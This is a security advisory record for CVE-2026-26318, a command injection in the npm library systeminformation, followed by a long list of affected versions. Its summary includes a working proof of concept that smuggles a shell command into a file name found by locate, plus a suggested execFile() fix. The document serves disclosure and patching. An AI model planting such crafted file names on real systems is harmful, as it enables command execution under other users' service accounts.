@@ -1,0 +1,876 @@
+advisory_id: GHSA-5vv4-hvf7-2h46
+datasource_id: github_osv/GHSA-5vv4-hvf7-2h46
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-5vv4-hvf7-2h46/GHSA-5vv4-hvf7-2h46.json
+aliases:
+  - CVE-2026-26318
+summary: "# Command Injection via Unsanitized `locate` Output in `versions()` — systeminformation\n\
+  \n**Package:** systeminformation (npm)  \n**Tested Version:** 5.30.7  \n**Affected Platform:**\
+  \ Linux  \n**Author:** Sebastian Hildebrandt  \n**Weekly Downloads:** ~5,000,000+  \n**Repository:**\
+  \ https://github.com/sebhildebrandt/systeminformation  \n**Severity:** Medium  \n**CWE:**\
+  \ CWE-78 (OS Command Injection)  \n\n---\n\n### The Vulnerable Code Path\n\nInside the `versions()`\
+  \ function, when detecting the PostgreSQL version on Linux, the code does this:\n\n```javascript\n\
+  // lib/osinfo.js — lines 770-776\n\nexec('locate bin/postgres', (error, stdout) => {\n  if\
+  \ (!error) {\n    const postgresqlBin = stdout.toString().split('\\n').sort();\n    if (postgresqlBin.length)\
+  \ {\n      exec(postgresqlBin[postgresqlBin.length - 1] + ' -V', (error, stdout) => {\n  \
+  \      // parses version string...\n      });\n    }\n  }\n});\n```\n\nHere's what happens\
+  \ step by step:\n\n1. It runs `locate bin/postgres` to search the filesystem for PostgreSQL\
+  \ binaries\n2. It splits the output by newline and sorts the results alphabetically\n3. It\
+  \ takes the **last element** (highest alphabetically)\n4. It concatenates that path directly\
+  \ into a new `exec()` call with `+ ' -V'`\n\n**No `sanitizeShellString()`. No path validation.\
+  \ No `execFile()`. Raw string concatenation into `exec()`.**\n\nThe `locate` command reads\
+  \ from a system-wide database (`plocate.db` or `mlocate.db`) that indexes all filenames on\
+  \ the system. If any indexed filename contains shell metacharacters — specifically semicolons\
+  \ — those characters will be interpreted by the shell when passed to `exec()`.\n\n---\n\n\
+  ## Exploitation\n\n### Prerequisites\n\nFor this vulnerability to be exploitable, the following\
+  \ conditions must be met:\n\n1. **Target system runs Linux** — the vulnerable code path is\
+  \ inside an `if (_linux)` block\n2. **`locate` / `plocate` is installed** — common on Ubuntu,\
+  \ Debian, Fedora, RHEL\n3. **PostgreSQL binary exists in the locate database** — so `locate\
+  \ bin/postgres` returns results (otherwise the code falls through to a safe `psql -V` fallback)\n\
+  4. **The attacker can create files on the filesystem** — in any directory that gets indexed\
+  \ by `updatedb`\n5. **The locate database gets updated** — `updatedb` runs daily via systemd\
+  \ timer (`plocate-updatedb.timer`) or cron on most distros\n\n### Step 1 — Verify the Environment\n\
+  \nOn the target machine, confirm locate is available and running:\n\n```\nwhich locate\n#\
+  \ /usr/bin/locate\n\nsystemctl list-timers | grep plocate\n# plocate-updatedb.timer    plocate-updatedb.service\n\
+  # (runs daily, typically around 1-2 AM)\n```\n\nCheck who owns the locate database:\n\n```\n\
+  ls -la /var/lib/plocate/plocate.db\n# -rw-r----- 1 root plocate 18851616 Feb 14 01:50 /var/lib/plocate/plocate.db\n\
+  ```\n\nDatabase is root-owned and updated by root. Regular users cannot update it directly,\
+  \ but `updatedb` runs on a daily schedule and indexes all readable files.\n\n### Step 2 —\
+  \ Craft the Malicious File Path\n\nThe key insight is that **Linux allows semicolons in filenames**,\
+  \ and `exec()` passes strings through `/bin/sh -c` which **interprets semicolons as command\
+  \ separators**.\n\nCreate a file whose path contains an injected command:\n\n```\nmkdir -p\
+  \ \"/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin\"\ntouch \"/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres\"\
+  \n```\n\nVerify it exists:\n\n```\nfind /var/tmp -name postgres\n# /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres\n\
+  ```\n\nThis file needs to end up in the `locate` database. On a real system, this happens\
+  \ automatically when `updatedb` runs overnight. For testing purposes:\n\n```\nsudo updatedb\n\
+  ```\n\nThen verify locate picks it up:\n\n```\nlocate bin/postgres\n# /usr/lib/postgresql/14/bin/postgres\n\
+  # /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres\n```\n\n### Step 3 — Understand the Sort\
+  \ Trick\n\nThe vulnerable code sorts the locate results alphabetically and takes the **last**\
+  \ element:\n\n```javascript\nconst postgresqlBin = stdout.toString().split('\\n').sort();\n\
+  exec(postgresqlBin[postgresqlBin.length - 1] + ' -V', ...);\n```\n\nAlphabetically, `/var/`\
+  \ sorts **after** `/usr/`. So our malicious path naturally becomes the selected one:\n\n```\n\
+  Node.js sort order:\n  [0] /usr/lib/postgresql/14/bin/postgres   ← legitimate\n  [1] /var/tmp/x;touch\
+  \ /tmp/SI_RCE_PROOF;/bin/postgres   ← selected (last)\n```\n\nQuick verification:\n\n```\n\
+  node -e \"\nconst paths = [\n  '/usr/lib/postgresql/14/bin/postgres',\n  '/var/tmp/x;touch\
+  \ /tmp/SI_RCE_PROOF;/bin/postgres'\n];\nconsole.log('Sorted:', paths.sort());\nconsole.log('Selected\
+  \ (last):', paths[paths.length - 1]);\n\"\n```\n\nOutput:\n\n```\nSorted: [\n  '/usr/lib/postgresql/14/bin/postgres',\n\
+  \  '/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres'\n]\nSelected (last): /var/tmp/x;touch\
+  \ /tmp/SI_RCE_PROOF;/bin/postgres\n```\n\n### Step 4 — Trigger the Vulnerability\n\nNow when\
+  \ any application using systeminformation calls `versions()` requesting the postgresql version,\
+  \ the injected command fires:\n\n```javascript\nconst si = require('systeminformation');\n\
+  \n// This is a normal, innocent API call\nsi.versions('postgresql').then(data => {\n  console.log(data);\n\
+  });\n```\n\nInternally, the library builds and executes this command:\n\n```\n/var/tmp/x;touch\
+  \ /tmp/SI_RCE_PROOF;/bin/postgres -V\n```\n\nThe shell (`/bin/sh -c`) interprets this as three\
+  \ separate commands:\n\n```\n/var/tmp/x                         →  fails silently (not executable)\n\
+  touch /tmp/SI_RCE_PROOF            →  ATTACKER'S COMMAND EXECUTES\n/bin/postgres -V      \
+  \             →  runs normally, returns version\n```\n\n### Step 5 — Verify Code Execution\n\
+  \n```\nls -la /tmp/SI_RCE_PROOF\n# -rw-rw-r-- 1 appuser appuser 0 Feb 14 15:30 /tmp/SI_RCE_PROOF\n\
+  ```\n\nThe file exists. Arbitrary command execution confirmed.\n\nThe injected command runs\
+  \ with **whatever privileges the Node.js process has**. In a monitoring dashboard or backend\
+  \ API context, that's typically the application service account.\n\n---\n\n## Real-World Attack\
+  \ Scenarios\n\n### Scenario 1 — Shared Hosting / Multi-Tenant Server\n\nA low-privileged user\
+  \ on a shared server creates the malicious file in `/tmp` or their home directory. The hosting\
+  \ provider runs a monitoring agent that uses `systeminformation` for health dashboards. Next\
+  \ time the agent calls `versions()`, the attacker's command executes under the monitoring\
+  \ agent's (higher-privileged) service account.\n\n### Scenario 2 — CI/CD Pipeline Poisoning\n\
+  \nA malicious contributor submits a PR that includes a build step creating files with crafted\
+  \ names. If the CI pipeline uses `systeminformation` for environment reporting (common in\
+  \ test harnesses and build dashboards), the injected commands execute in the CI runner context\
+  \ — potentially leaking secrets, tokens, and deployment keys.\n\n### Scenario 3 — Container\
+  \ / Kubernetes Escape\n\nIn containerized environments where `/var` or `/tmp` sits on a shared\
+  \ volume, a compromised container creates the malicious file. When the host-level monitoring\
+  \ agent (running `systeminformation`) calls `versions()`, the injected command executes on\
+  \ the host, breaking out of the container boundary.\n\n---\n\n## Suggested Fix\n\nReplace\
+  \ `exec()` with `execFile()` for the PostgreSQL binary version check. `execFile()` does not\
+  \ spawn a shell, so metacharacters in the path are treated as literal characters:\n\n```javascript\n\
+  const { execFile } = require('child_process');\n\nexec('locate bin/postgres', (error, stdout)\
+  \ => {\n  if (!error) {\n    const postgresqlBin = stdout.toString().split('\\n')\n      .filter(p\
+  \ => p.trim().length > 0)\n      .sort();\n    if (postgresqlBin.length) {\n      execFile(postgresqlBin[postgresqlBin.length\
+  \ - 1], ['-V'], (error, stdout) => {\n        // ... parse version\n      });\n    }\n  }\n\
+  });\n```\n\nAdditionally, the locate output should be validated against a safe path pattern\
+  \ before use:\n\n```javascript\nconst safePath = /^[a-zA-Z0-9/_.-]+$/;\nconst postgresqlBin\
+  \ = stdout.toString().split('\\n')\n  .filter(p => safePath.test(p.trim()))\n  .sort();\n\
+  ```\n\n---\n\n## Disclosure\n\n- **Reported via:** GitHub Private Security Advisory\n- **Advisory\
+  \ URL:** https://github.com/sebhildebrandt/systeminformation/security/advisories/new\n- **Security\
+  \ Contact:** security@systeminformation.io"
+impacted_packages:
+  - purl: pkg:github/sebhildebrandt/systeminformation
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/sebhildebrandt/systeminformation
+        commit: b67d3715eec881038ccbaace2f2711419ac3e107
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/systeminformation
+    affected_versions: vers:npm/<=5.30.7
+    fixed_versions: vers:npm/5.31.0
+    affected_packages:
+      - pkg:npm/systeminformation@1.0.0
+      - pkg:npm/systeminformation@1.0.1
+      - pkg:npm/systeminformation@1.0.2
+      - pkg:npm/systeminformation@1.0.3
+      - pkg:npm/systeminformation@1.0.4
+      - pkg:npm/systeminformation@1.0.5
+      - pkg:npm/systeminformation@1.0.6
+      - pkg:npm/systeminformation@1.0.7
+      - pkg:npm/systeminformation@2.0.0
+      - pkg:npm/systeminformation@2.0.1
+      - pkg:npm/systeminformation@2.0.2
+      - pkg:npm/systeminformation@2.0.3
+      - pkg:npm/systeminformation@2.0.4
+      - pkg:npm/systeminformation@2.0.5
+      - pkg:npm/systeminformation@3.0.0
+      - pkg:npm/systeminformation@3.0.1
+      - pkg:npm/systeminformation@3.1.0
+      - pkg:npm/systeminformation@3.2.0
+      - pkg:npm/systeminformation@3.2.1
+      - pkg:npm/systeminformation@3.3.0
+      - pkg:npm/systeminformation@3.4.0
+      - pkg:npm/systeminformation@3.4.1
+      - pkg:npm/systeminformation@3.4.2
+      - pkg:npm/systeminformation@3.4.3
+      - pkg:npm/systeminformation@3.4.4
+      - pkg:npm/systeminformation@3.5.0
+      - pkg:npm/systeminformation@3.5.1
+      - pkg:npm/systeminformation@3.6.0
+      - pkg:npm/systeminformation@3.7.0
+      - pkg:npm/systeminformation@3.7.1
+      - pkg:npm/systeminformation@3.8.0
+      - pkg:npm/systeminformation@3.8.1
+      - pkg:npm/systeminformation@3.9.0
+      - pkg:npm/systeminformation@3.10.0
+      - pkg:npm/systeminformation@3.10.1
+      - pkg:npm/systeminformation@3.10.2
+      - pkg:npm/systeminformation@3.11.0
+      - pkg:npm/systeminformation@3.11.1
+      - pkg:npm/systeminformation@3.11.2
+      - pkg:npm/systeminformation@3.12.0
+      - pkg:npm/systeminformation@3.12.1
+      - pkg:npm/systeminformation@3.13.0
+      - pkg:npm/systeminformation@3.14.0
+      - pkg:npm/systeminformation@3.15.0
+      - pkg:npm/systeminformation@3.15.1
+      - pkg:npm/systeminformation@3.15.2
+      - pkg:npm/systeminformation@3.16.0
+      - pkg:npm/systeminformation@3.17.0
+      - pkg:npm/systeminformation@3.17.1
+      - pkg:npm/systeminformation@3.17.2
+      - pkg:npm/systeminformation@3.17.3
+      - pkg:npm/systeminformation@3.18.0
+      - pkg:npm/systeminformation@3.19.0
+      - pkg:npm/systeminformation@3.20.0
+      - pkg:npm/systeminformation@3.20.1
+      - pkg:npm/systeminformation@3.21.0
+      - pkg:npm/systeminformation@3.22.0
+      - pkg:npm/systeminformation@3.23.0
+      - pkg:npm/systeminformation@3.23.1
+      - pkg:npm/systeminformation@3.23.2
+      - pkg:npm/systeminformation@3.23.3
+      - pkg:npm/systeminformation@3.23.4
+      - pkg:npm/systeminformation@3.23.5
+      - pkg:npm/systeminformation@3.23.6
+      - pkg:npm/systeminformation@3.23.7
+      - pkg:npm/systeminformation@3.24.0
+      - pkg:npm/systeminformation@3.25.0
+      - pkg:npm/systeminformation@3.25.1
+      - pkg:npm/systeminformation@3.26.0
+      - pkg:npm/systeminformation@3.26.1
+      - pkg:npm/systeminformation@3.26.2
+      - pkg:npm/systeminformation@3.27.0
+      - pkg:npm/systeminformation@3.27.1
+      - pkg:npm/systeminformation@3.28.0
+      - pkg:npm/systeminformation@3.29.0
+      - pkg:npm/systeminformation@3.30.0
+      - pkg:npm/systeminformation@3.30.1
+      - pkg:npm/systeminformation@3.30.2
+      - pkg:npm/systeminformation@3.30.3
+      - pkg:npm/systeminformation@3.30.4
+      - pkg:npm/systeminformation@3.30.5
+      - pkg:npm/systeminformation@3.30.6
+      - pkg:npm/systeminformation@3.31.0
+      - pkg:npm/systeminformation@3.31.1
+      - pkg:npm/systeminformation@3.31.2
+      - pkg:npm/systeminformation@3.31.3
+      - pkg:npm/systeminformation@3.31.4
+      - pkg:npm/systeminformation@3.32.0
+      - pkg:npm/systeminformation@3.32.1
+      - pkg:npm/systeminformation@3.32.2
+      - pkg:npm/systeminformation@3.32.3
+      - pkg:npm/systeminformation@3.32.4
+      - pkg:npm/systeminformation@3.33.0
+      - pkg:npm/systeminformation@3.33.1
+      - pkg:npm/systeminformation@3.33.2
+      - pkg:npm/systeminformation@3.33.3
+      - pkg:npm/systeminformation@3.33.4
+      - pkg:npm/systeminformation@3.33.5
+      - pkg:npm/systeminformation@3.33.6
+      - pkg:npm/systeminformation@3.33.7
+      - pkg:npm/systeminformation@3.33.8
+      - pkg:npm/systeminformation@3.33.9
+      - pkg:npm/systeminformation@3.33.10
+      - pkg:npm/systeminformation@3.33.11
+      - pkg:npm/systeminformation@3.33.12
+      - pkg:npm/systeminformation@3.33.13
+      - pkg:npm/systeminformation@3.33.14
+      - pkg:npm/systeminformation@3.33.18
+      - pkg:npm/systeminformation@3.34.0
+      - pkg:npm/systeminformation@3.34.1
+      - pkg:npm/systeminformation@3.35.0
+      - pkg:npm/systeminformation@3.36.0
+      - pkg:npm/systeminformation@3.37.0
+      - pkg:npm/systeminformation@3.37.1
+      - pkg:npm/systeminformation@3.37.2
+      - pkg:npm/systeminformation@3.37.3
+      - pkg:npm/systeminformation@3.37.4
+      - pkg:npm/systeminformation@3.37.5
+      - pkg:npm/systeminformation@3.37.6
+      - pkg:npm/systeminformation@3.37.7
+      - pkg:npm/systeminformation@3.37.8
+      - pkg:npm/systeminformation@3.37.9
+      - pkg:npm/systeminformation@3.37.10
+      - pkg:npm/systeminformation@3.37.11
+      - pkg:npm/systeminformation@3.37.12
+      - pkg:npm/systeminformation@3.38.0
+      - pkg:npm/systeminformation@3.39.0
+      - pkg:npm/systeminformation@3.40.0
+      - pkg:npm/systeminformation@3.40.1
+      - pkg:npm/systeminformation@3.41.0
+      - pkg:npm/systeminformation@3.41.1
+      - pkg:npm/systeminformation@3.41.2
+      - pkg:npm/systeminformation@3.41.3
+      - pkg:npm/systeminformation@3.41.4
+      - pkg:npm/systeminformation@3.42.0
+      - pkg:npm/systeminformation@3.42.1
+      - pkg:npm/systeminformation@3.42.2
+      - pkg:npm/systeminformation@3.42.3
+      - pkg:npm/systeminformation@3.42.4
+      - pkg:npm/systeminformation@3.42.5
+      - pkg:npm/systeminformation@3.42.6
+      - pkg:npm/systeminformation@3.42.8
+      - pkg:npm/systeminformation@3.42.9
+      - pkg:npm/systeminformation@3.42.10
+      - pkg:npm/systeminformation@3.43.0
+      - pkg:npm/systeminformation@3.44.0
+      - pkg:npm/systeminformation@3.44.1
+      - pkg:npm/systeminformation@3.44.2
+      - pkg:npm/systeminformation@3.45.0
+      - pkg:npm/systeminformation@3.45.1
+      - pkg:npm/systeminformation@3.45.2
+      - pkg:npm/systeminformation@3.45.3
+      - pkg:npm/systeminformation@3.45.4
+      - pkg:npm/systeminformation@3.45.5
+      - pkg:npm/systeminformation@3.45.6
+      - pkg:npm/systeminformation@3.45.7
+      - pkg:npm/systeminformation@3.45.8
+      - pkg:npm/systeminformation@3.45.9
+      - pkg:npm/systeminformation@3.45.10
+      - pkg:npm/systeminformation@3.46.0
+      - pkg:npm/systeminformation@3.47.0
+      - pkg:npm/systeminformation@3.48.0
+      - pkg:npm/systeminformation@3.48.1
+      - pkg:npm/systeminformation@3.48.2
+      - pkg:npm/systeminformation@3.48.3
+      - pkg:npm/systeminformation@3.48.4
+      - pkg:npm/systeminformation@3.49.0
+      - pkg:npm/systeminformation@3.49.1
+      - pkg:npm/systeminformation@3.49.2
+      - pkg:npm/systeminformation@3.49.3
+      - pkg:npm/systeminformation@3.49.4
+      - pkg:npm/systeminformation@3.50.0
+      - pkg:npm/systeminformation@3.50.1
+      - pkg:npm/systeminformation@3.50.2
+      - pkg:npm/systeminformation@3.50.3
+      - pkg:npm/systeminformation@3.51.0
+      - pkg:npm/systeminformation@3.51.1
+      - pkg:npm/systeminformation@3.51.2
+      - pkg:npm/systeminformation@3.51.3
+      - pkg:npm/systeminformation@3.51.4
+      - pkg:npm/systeminformation@3.52.0
+      - pkg:npm/systeminformation@3.52.1
+      - pkg:npm/systeminformation@3.52.2
+      - pkg:npm/systeminformation@3.52.3
+      - pkg:npm/systeminformation@3.52.4
+      - pkg:npm/systeminformation@3.52.5
+      - pkg:npm/systeminformation@3.52.6
+      - pkg:npm/systeminformation@3.52.7
+      - pkg:npm/systeminformation@3.53.0
+      - pkg:npm/systeminformation@3.53.1
+      - pkg:npm/systeminformation@3.54.0
+      - pkg:npm/systeminformation@4.0.0
+      - pkg:npm/systeminformation@4.0.1
+      - pkg:npm/systeminformation@4.0.2
+      - pkg:npm/systeminformation@4.0.3
+      - pkg:npm/systeminformation@4.0.4
+      - pkg:npm/systeminformation@4.0.5
+      - pkg:npm/systeminformation@4.0.6
+      - pkg:npm/systeminformation@4.0.7
+      - pkg:npm/systeminformation@4.0.8
+      - pkg:npm/systeminformation@4.0.9
+      - pkg:npm/systeminformation@4.0.10
+      - pkg:npm/systeminformation@4.0.11
+      - pkg:npm/systeminformation@4.0.12
+      - pkg:npm/systeminformation@4.0.13
+      - pkg:npm/systeminformation@4.0.14
+      - pkg:npm/systeminformation@4.0.15
+      - pkg:npm/systeminformation@4.0.16
+      - pkg:npm/systeminformation@4.1.0
+      - pkg:npm/systeminformation@4.1.1
+      - pkg:npm/systeminformation@4.1.2
+      - pkg:npm/systeminformation@4.1.3
+      - pkg:npm/systeminformation@4.1.4
+      - pkg:npm/systeminformation@4.1.5
+      - pkg:npm/systeminformation@4.1.6
+      - pkg:npm/systeminformation@4.1.7
+      - pkg:npm/systeminformation@4.1.8
+      - pkg:npm/systeminformation@4.2.0
+      - pkg:npm/systeminformation@4.2.1
+      - pkg:npm/systeminformation@4.3.0
+      - pkg:npm/systeminformation@4.4.0
+      - pkg:npm/systeminformation@4.4.1
+      - pkg:npm/systeminformation@4.5.0
+      - pkg:npm/systeminformation@4.5.1
+      - pkg:npm/systeminformation@4.6.0
+      - pkg:npm/systeminformation@4.6.1
+      - pkg:npm/systeminformation@4.7.0
+      - pkg:npm/systeminformation@4.7.1
+      - pkg:npm/systeminformation@4.7.2
+      - pkg:npm/systeminformation@4.7.3
+      - pkg:npm/systeminformation@4.8.0
+      - pkg:npm/systeminformation@4.8.1
+      - pkg:npm/systeminformation@4.8.2
+      - pkg:npm/systeminformation@4.8.3
+      - pkg:npm/systeminformation@4.8.4
+      - pkg:npm/systeminformation@4.9.0
+      - pkg:npm/systeminformation@4.9.1
+      - pkg:npm/systeminformation@4.9.2
+      - pkg:npm/systeminformation@4.10.0
+      - pkg:npm/systeminformation@4.11.0
+      - pkg:npm/systeminformation@4.11.1
+      - pkg:npm/systeminformation@4.11.2
+      - pkg:npm/systeminformation@4.11.3
+      - pkg:npm/systeminformation@4.11.4
+      - pkg:npm/systeminformation@4.11.5
+      - pkg:npm/systeminformation@4.11.6
+      - pkg:npm/systeminformation@4.12.0
+      - pkg:npm/systeminformation@4.12.1
+      - pkg:npm/systeminformation@4.12.2
+      - pkg:npm/systeminformation@4.13.0
+      - pkg:npm/systeminformation@4.13.1
+      - pkg:npm/systeminformation@4.13.2
+      - pkg:npm/systeminformation@4.14.0
+      - pkg:npm/systeminformation@4.14.1
+      - pkg:npm/systeminformation@4.14.2
+      - pkg:npm/systeminformation@4.14.3
+      - pkg:npm/systeminformation@4.14.4
+      - pkg:npm/systeminformation@4.14.5
+      - pkg:npm/systeminformation@4.14.6
+      - pkg:npm/systeminformation@4.14.7
+      - pkg:npm/systeminformation@4.14.8
+      - pkg:npm/systeminformation@4.14.9
+      - pkg:npm/systeminformation@4.14.10
+      - pkg:npm/systeminformation@4.14.11
+      - pkg:npm/systeminformation@4.14.12
+      - pkg:npm/systeminformation@4.14.13
+      - pkg:npm/systeminformation@4.14.14
+      - pkg:npm/systeminformation@4.14.15
+      - pkg:npm/systeminformation@4.14.16
+      - pkg:npm/systeminformation@4.14.17
+      - pkg:npm/systeminformation@4.15.0
+      - pkg:npm/systeminformation@4.15.1
+      - pkg:npm/systeminformation@4.15.2
+      - pkg:npm/systeminformation@4.15.3
+      - pkg:npm/systeminformation@4.16.0
+      - pkg:npm/systeminformation@4.16.1
+      - pkg:npm/systeminformation@4.17.0
+      - pkg:npm/systeminformation@4.17.1
+      - pkg:npm/systeminformation@4.17.2
+      - pkg:npm/systeminformation@4.17.3
+      - pkg:npm/systeminformation@4.18.0
+      - pkg:npm/systeminformation@4.18.1
+      - pkg:npm/systeminformation@4.18.2
+      - pkg:npm/systeminformation@4.18.3
+      - pkg:npm/systeminformation@4.19.0
+      - pkg:npm/systeminformation@4.19.1
+      - pkg:npm/systeminformation@4.19.2
+      - pkg:npm/systeminformation@4.19.3
+      - pkg:npm/systeminformation@4.19.4
+      - pkg:npm/systeminformation@4.20.0
+      - pkg:npm/systeminformation@4.20.1
+      - pkg:npm/systeminformation@4.21.0
+      - pkg:npm/systeminformation@4.21.1
+      - pkg:npm/systeminformation@4.21.2
+      - pkg:npm/systeminformation@4.21.3
+      - pkg:npm/systeminformation@4.22.0
+      - pkg:npm/systeminformation@4.22.1
+      - pkg:npm/systeminformation@4.22.2
+      - pkg:npm/systeminformation@4.22.3
+      - pkg:npm/systeminformation@4.22.4
+      - pkg:npm/systeminformation@4.22.5
+      - pkg:npm/systeminformation@4.22.6
+      - pkg:npm/systeminformation@4.22.7
+      - pkg:npm/systeminformation@4.23.0
+      - pkg:npm/systeminformation@4.23.1
+      - pkg:npm/systeminformation@4.23.2
+      - pkg:npm/systeminformation@4.23.3
+      - pkg:npm/systeminformation@4.23.4
+      - pkg:npm/systeminformation@4.23.5
+      - pkg:npm/systeminformation@4.23.6
+      - pkg:npm/systeminformation@4.23.7
+      - pkg:npm/systeminformation@4.23.8
+      - pkg:npm/systeminformation@4.23.9
+      - pkg:npm/systeminformation@4.23.10
+      - pkg:npm/systeminformation@4.24.0
+      - pkg:npm/systeminformation@4.24.1
+      - pkg:npm/systeminformation@4.24.2
+      - pkg:npm/systeminformation@4.25.0
+      - pkg:npm/systeminformation@4.25.1
+      - pkg:npm/systeminformation@4.25.2
+      - pkg:npm/systeminformation@4.26.0
+      - pkg:npm/systeminformation@4.26.1
+      - pkg:npm/systeminformation@4.26.2
+      - pkg:npm/systeminformation@4.26.3
+      - pkg:npm/systeminformation@4.26.4
+      - pkg:npm/systeminformation@4.26.5
+      - pkg:npm/systeminformation@4.26.6
+      - pkg:npm/systeminformation@4.26.7
+      - pkg:npm/systeminformation@4.26.8
+      - pkg:npm/systeminformation@4.26.9
+      - pkg:npm/systeminformation@4.26.10
+      - pkg:npm/systeminformation@4.26.11
+      - pkg:npm/systeminformation@4.26.12
+      - pkg:npm/systeminformation@4.27.0
+      - pkg:npm/systeminformation@4.27.1
+      - pkg:npm/systeminformation@4.27.2
+      - pkg:npm/systeminformation@4.27.3
+      - pkg:npm/systeminformation@4.27.4
+      - pkg:npm/systeminformation@4.27.5
+      - pkg:npm/systeminformation@4.27.6
+      - pkg:npm/systeminformation@4.27.7
+      - pkg:npm/systeminformation@4.27.8
+      - pkg:npm/systeminformation@4.27.9
+      - pkg:npm/systeminformation@4.27.10
+      - pkg:npm/systeminformation@4.27.11
+      - pkg:npm/systeminformation@4.28.0
+      - pkg:npm/systeminformation@4.28.1
+      - pkg:npm/systeminformation@4.29.0
+      - pkg:npm/systeminformation@4.29.1
+      - pkg:npm/systeminformation@4.29.2
+      - pkg:npm/systeminformation@4.29.3
+      - pkg:npm/systeminformation@4.30.0
+      - pkg:npm/systeminformation@4.30.1
+      - pkg:npm/systeminformation@4.30.2
+      - pkg:npm/systeminformation@4.30.3
+      - pkg:npm/systeminformation@4.30.4
+      - pkg:npm/systeminformation@4.30.5
+      - pkg:npm/systeminformation@4.30.6
+      - pkg:npm/systeminformation@4.30.7
+      - pkg:npm/systeminformation@4.30.8
+      - pkg:npm/systeminformation@4.30.9
+      - pkg:npm/systeminformation@4.30.10
+      - pkg:npm/systeminformation@4.30.11
+      - pkg:npm/systeminformation@4.31.0
+      - pkg:npm/systeminformation@4.31.1
+      - pkg:npm/systeminformation@4.31.2
+      - pkg:npm/systeminformation@4.32.0
+      - pkg:npm/systeminformation@4.33.0
+      - pkg:npm/systeminformation@4.33.1
+      - pkg:npm/systeminformation@4.33.2
+      - pkg:npm/systeminformation@4.33.3
+      - pkg:npm/systeminformation@4.33.4
+      - pkg:npm/systeminformation@4.33.5
+      - pkg:npm/systeminformation@4.33.6
+      - pkg:npm/systeminformation@4.33.7
+      - pkg:npm/systeminformation@4.33.8
+      - pkg:npm/systeminformation@4.34.0
+      - pkg:npm/systeminformation@4.34.1
+      - pkg:npm/systeminformation@4.34.2
+      - pkg:npm/systeminformation@4.34.3
+      - pkg:npm/systeminformation@4.34.4
+      - pkg:npm/systeminformation@4.34.5
+      - pkg:npm/systeminformation@4.34.6
+      - pkg:npm/systeminformation@4.34.7
+      - pkg:npm/systeminformation@4.34.8
+      - pkg:npm/systeminformation@4.34.9
+      - pkg:npm/systeminformation@4.34.10
+      - pkg:npm/systeminformation@4.34.11
+      - pkg:npm/systeminformation@4.34.12
+      - pkg:npm/systeminformation@4.34.13
+      - pkg:npm/systeminformation@4.34.14
+      - pkg:npm/systeminformation@4.34.15
+      - pkg:npm/systeminformation@4.34.16
+      - pkg:npm/systeminformation@4.34.17
+      - pkg:npm/systeminformation@4.34.18
+      - pkg:npm/systeminformation@4.34.19
+      - pkg:npm/systeminformation@4.34.20
+      - pkg:npm/systeminformation@4.34.21
+      - pkg:npm/systeminformation@4.34.22
+      - pkg:npm/systeminformation@4.34.23
+      - pkg:npm/systeminformation@5.0.0
+      - pkg:npm/systeminformation@5.0.1
+      - pkg:npm/systeminformation@5.0.2
+      - pkg:npm/systeminformation@5.0.3
+      - pkg:npm/systeminformation@5.0.4
+      - pkg:npm/systeminformation@5.0.5
+      - pkg:npm/systeminformation@5.0.6
+      - pkg:npm/systeminformation@5.0.7
+      - pkg:npm/systeminformation@5.0.8
+      - pkg:npm/systeminformation@5.0.9
+      - pkg:npm/systeminformation@5.0.10
+      - pkg:npm/systeminformation@5.0.11
+      - pkg:npm/systeminformation@5.1.0
+      - pkg:npm/systeminformation@5.1.1
+      - pkg:npm/systeminformation@5.1.2
+      - pkg:npm/systeminformation@5.2.0
+      - pkg:npm/systeminformation@5.2.1
+      - pkg:npm/systeminformation@5.2.2
+      - pkg:npm/systeminformation@5.2.3
+      - pkg:npm/systeminformation@5.2.4
+      - pkg:npm/systeminformation@5.2.5
+      - pkg:npm/systeminformation@5.2.6
+      - pkg:npm/systeminformation@5.2.7
+      - pkg:npm/systeminformation@5.3.0
+      - pkg:npm/systeminformation@5.3.1
+      - pkg:npm/systeminformation@5.3.2
+      - pkg:npm/systeminformation@5.3.3
+      - pkg:npm/systeminformation@5.3.4
+      - pkg:npm/systeminformation@5.3.5
+      - pkg:npm/systeminformation@5.4.0
+      - pkg:npm/systeminformation@5.5.0
+      - pkg:npm/systeminformation@5.6.0
+      - pkg:npm/systeminformation@5.6.1
+      - pkg:npm/systeminformation@5.6.2
+      - pkg:npm/systeminformation@5.6.3
+      - pkg:npm/systeminformation@5.6.4
+      - pkg:npm/systeminformation@5.6.5
+      - pkg:npm/systeminformation@5.6.6
+      - pkg:npm/systeminformation@5.6.7
+      - pkg:npm/systeminformation@5.6.8
+      - pkg:npm/systeminformation@5.6.9
+      - pkg:npm/systeminformation@5.6.10
+      - pkg:npm/systeminformation@5.6.11
+      - pkg:npm/systeminformation@5.6.12
+      - pkg:npm/systeminformation@5.6.13
+      - pkg:npm/systeminformation@5.6.14
+      - pkg:npm/systeminformation@5.6.15
+      - pkg:npm/systeminformation@5.6.16
+      - pkg:npm/systeminformation@5.6.17
+      - pkg:npm/systeminformation@5.6.18
+      - pkg:npm/systeminformation@5.6.19
+      - pkg:npm/systeminformation@5.6.20
+      - pkg:npm/systeminformation@5.6.21
+      - pkg:npm/systeminformation@5.6.22
+      - pkg:npm/systeminformation@5.7.0
+      - pkg:npm/systeminformation@5.7.1
+      - pkg:npm/systeminformation@5.7.2
+      - pkg:npm/systeminformation@5.7.3
+      - pkg:npm/systeminformation@5.7.4
+      - pkg:npm/systeminformation@5.7.5
+      - pkg:npm/systeminformation@5.7.6
+      - pkg:npm/systeminformation@5.7.7
+      - pkg:npm/systeminformation@5.7.8
+      - pkg:npm/systeminformation@5.7.9
+      - pkg:npm/systeminformation@5.7.10
+      - pkg:npm/systeminformation@5.7.11
+      - pkg:npm/systeminformation@5.7.12
+      - pkg:npm/systeminformation@5.7.13
+      - pkg:npm/systeminformation@5.7.14
+      - pkg:npm/systeminformation@5.8.0
+      - pkg:npm/systeminformation@5.8.1
+      - pkg:npm/systeminformation@5.8.2
+      - pkg:npm/systeminformation@5.8.3
+      - pkg:npm/systeminformation@5.8.4
